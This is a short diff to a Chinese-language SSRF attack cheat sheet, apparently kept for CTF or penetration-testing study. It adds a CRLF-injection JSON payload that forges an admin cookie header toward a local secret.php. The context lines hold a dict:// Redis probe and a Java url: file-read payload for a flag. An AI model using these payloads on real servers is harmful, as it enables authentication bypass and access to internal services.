@@ -13,6 +13,10 @@ curl_exec() curl_exec函数⽤于执⾏指定的cURL会话。
 | dict://        | dict://127.0.0.1:6379 //探测 redis 是否存活 |
 | (仅 java) url: | `url?url:=file:/flag%23.html`               | file 和 netdoc 都可以读 |
 
+### CRLF 注入
+
+| CRLF 注入 | application/json `{"url":"http://127.0.0.1/secret.php","author":"ddd\r\nCookie: admin=dHJ1ZQ"}` |
+
 ## gopher
 
 [gopher 协议的利用](https://mp.weixin.qq.com/s/lVzMSXn42SjTPb5EnY8NgA)
